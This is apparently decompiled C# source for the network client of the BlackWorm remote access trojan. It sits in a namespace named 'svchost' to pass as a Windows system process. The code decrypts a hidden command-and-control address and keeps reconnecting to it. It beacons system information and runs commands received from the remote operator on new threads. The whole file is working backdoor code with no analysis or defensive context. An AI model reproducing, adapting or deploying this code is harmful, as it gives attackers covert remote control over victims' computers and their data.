using System;
using System.Configuration;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using svchost.My;

namespace svchost;

public class TCP
{
	public string SPL;

	public TcpClient C;

	private bool CN;

	public TCP()
	{
		SPL = "[BlackWorm]";
		CN = false;
		Thread thread = new Thread(RC);
		thread.Start();
	}

	public void Send(byte[] b)
	{
		if (!CN)
		{
			return;
		}
		try
		{
			object obj = new MemoryStream();
			object[] array = new object[3] { b, 0, b.Length };
			object[] array2 = array;
			bool[] array3 = new bool[3] { true, false, false };
			NewLateBinding.LateCall(obj, (Type)null, "Write", array2, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				b = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
			}
			NewLateBinding.LateCall(obj, (Type)null, "Write", new object[3]
			{
				A.SB(SPL),
				0,
				SPL.Length
			}, (string[])null, (Type[])null, (bool[])null, true);
			C.Client.Send((byte[])NewLateBinding.LateGet(obj, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null), 0, Conversions.ToInteger(NewLateBinding.LateGet(obj, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null)), SocketFlags.None);
			NewLateBinding.LateCall(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			CN = false;
			ProjectData.ClearProjectError();
		}
	}

	public void Send(string S)
	{
		Send(A.SB(S));
	}

	public void RC()
	{
		MemoryStream memoryStream = new MemoryStream();
		int num = 0;
		checked
		{
			while (true)
			{
				try
				{
					if (C != null && C.Client.Connected && CN)
					{
						num++;
						if (num <= 500)
						{
							goto IL_0083;
						}
						num = 0;
						if (!(C.Client.Poll(-1, SelectMode.SelectRead) & (C.Client.Available <= 0)))
						{
							goto IL_0083;
						}
					}
					goto end_IL_0009;
					IL_0083:
					if (C.Available > 0)
					{
						byte[] array = new byte[C.Available - 1 + 1];
						C.Client.Receive(array, 0, array.Length, SocketFlags.None);
						memoryStream.Write(array, 0, array.Length);
						while (A.BS(memoryStream.ToArray()).Contains(SPL))
						{
							Array array2 = A.fx(memoryStream.ToArray(), SPL);
							Thread thread = new Thread(delegate(object a0)
							{
								A.IND((byte[])a0);
							});
							thread.Start(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array2, new object[1] { 0 }, (string[])null)));
							memoryStream.Dispose();
							memoryStream = new MemoryStream();
							if (array2.Length == 2)
							{
								memoryStream.Write((byte[])NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null), (Type)null, "length", new object[0], (string[])null, (Type[])null, (bool[])null)));
								continue;
							}
							break;
						}
					}
					goto IL_01be;
					end_IL_0009:;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				while (true)
				{
					CN = false;
					try
					{
						C.Client.Disconnect(reuseSocket: false);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					try
					{
						memoryStream.Dispose();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					memoryStream = new MemoryStream();
					try
					{
						C = new TcpClient();
						C.ReceiveTimeout = -1;
						C.SendTimeout = -1;
						C.SendBufferSize = 999999;
						C.ReceiveBufferSize = 999999;
						C.Client.SendBufferSize = 999999;
						C.Client.ReceiveBufferSize = 999999;
						num = 0;
						if (MySettingsProperty.Settings.TransferStatus)
						{
							C.Client.Connect(MySettingsProperty.Settings.NewHost, MySettingsProperty.Settings.NewPort);
						}
						else
						{
							MySettingsProperty.Settings.TransferStatus = false;
							((ApplicationSettingsBase)MySettingsProperty.Settings).Save();
						}
						if (Operators.CompareString(A.EncryptStatus, "True", false) == 0)
						{
							NewLateBinding.LateCall((object)C.Client, (Type)null, "Connect", new object[2]
							{
								RuntimeHelpers.GetObjectValue(RijndaelDecrypt(A.h, Encoding.ASCII.GetString(Convert.FromBase64String(A.EncryptKey)))),
								Convert.ToInt32(RuntimeHelpers.GetObjectValue(RijndaelDecrypt(A.port, Encoding.ASCII.GetString(Convert.FromBase64String(A.EncryptKey)))))
							}, (string[])null, (Type[])null, (bool[])null, true);
						}
						else if (!MySettingsProperty.Settings.TransferStatus)
						{
							C.Client.Connect(A.h, Convert.ToInt32(A.port));
						}
						CN = true;
						Send("!0" + A.Y + A.INF());
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						Thread.Sleep(2500);
						ProjectData.ClearProjectError();
						continue;
					}
					break;
				}
				continue;
				IL_01be:
				Thread.Sleep(1);
			}
		}
	}

	public object RijndaelDecrypt(string UDecryptU, string UKeyU)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(UKeyU, salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		try
		{
			byte[] array = Convert.FromBase64String(UDecryptU);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			UDecryptU = Encoding.UTF8.GetString(memoryStream.ToArray());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return UDecryptU;
	}
}
